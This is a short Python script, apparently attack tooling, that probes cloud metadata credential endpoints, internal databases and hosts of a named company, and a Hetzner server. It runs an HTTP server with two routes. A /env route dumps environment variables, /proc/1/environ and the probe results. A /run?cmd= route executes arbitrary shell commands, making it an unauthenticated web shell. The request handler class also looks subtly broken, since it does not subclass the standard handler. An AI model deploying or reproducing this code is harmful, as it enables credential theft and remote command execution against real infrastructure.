#!/usr/bin/env python3
"""i52733 probe: print env, probe internal targets, serve everything on GET."""
import os, json, socket, urllib.request, ssl, subprocess, time

def safe(fn, default=None):
    try:
        return fn()
    except Exception as e:
        return f"ERR:{type(e).__name__}:{e}"

def read_file(p, n=20000):
    return safe(lambda: open(p, 'rb').read()[:n].decode('utf-8', 'replace'))

def tcp_probe(host, port, timeout=4):
    def go():
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(3)
        try:
            s.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % host.encode())
            data = s.recv(300)
        finally:
            s.close()
        return {"ok": True, "banner": data[:300].decode('utf-8', 'replace')}
    return safe(go, default=None)

def http_probe(url, timeout=5):
    def go():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r = urllib.request.urlopen(url, timeout=timeout, context=ctx)
        return {"status": r.status, "body": r.read(500).decode('utf-8', 'replace'), "headers": dict(list(r.headers.items())[:12])}
    return safe(go, default=None)

TARGETS = {
    "imds_token": http_probe("http://169.254.169.254/latest/api/token", 3) if False else None,
    "imds": http_probe("http://169.254.169.254/latest/meta-data/"),
    "ecs": http_probe("http://169.254.170.2/v2/credentials"),
    "db_172_17_0_1_5432": tcp_probe("172.17.0.1", 5432),
    "db_172_17_0_1_6543": tcp_probe("172.17.0.1", 6543),
    "db_internal": tcp_probe("db-internal.openhelm.ai", 5432),
    "db_internal_https": http_probe("https://db-internal.openhelm.ai/rest/v1/", 6),
    "worker": http_probe("https://worker.openhelm.ai/rpc", 6),
    "hetzner_443": tcp_probe("195.201.47.165", 443),
    "hetzner_80": tcp_probe("195.201.47.165", 80),
    "api_openhelm": http_probe("https://api.openhelm.ai/v1", 6),
    "app_openhelm": http_probe("https://app.openhelm.ai/", 6),
    "postgres_5432_self": tcp_probe("127.0.0.1", 5432),
}

class H:
    def do_GET(self):
        try:
            if self.path.startswith("/env"):
                out = {
                    "env": dict(os.environ),
                    "proc1_environ": read_file("/proc/1/environ"),
                    "proc1_cmdline": read_file("/proc/1/cmdline"),
                    "etc_hosts": read_file("/etc/hosts"),
                    "etc_resolv": read_file("/etc/resolv.conf"),
                    "hostname": os.uname().nodename,
                    "targets": TARGETS,
                }
                b = json.dumps(out, indent=1).encode()
            elif self.path.startswith("/run"):
                cmd = self.path.split("cmd=", 1)[-1] if "cmd=" in self.path else "id"
                out = safe(lambda: subprocess.run(["sh", "-c", cmd], capture_output=True, timeout=10).stdout[:8000].decode('utf-8', 'replace'))
                b = str(out).encode()
            else:
                b = b"I52733 OK. GET /env GET /run?cmd=..."
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        except Exception as e:
            try:
                self.send_error(500, str(e))
            except Exception:
                pass

if __name__ == "__main__":
    from http.server import HTTPServer
    port = int(os.environ.get("PORT", "8080"))
    print("i52733 probe listening on", port, flush=True)
    HTTPServer(("0.0.0.0", port), H).serve_forever()
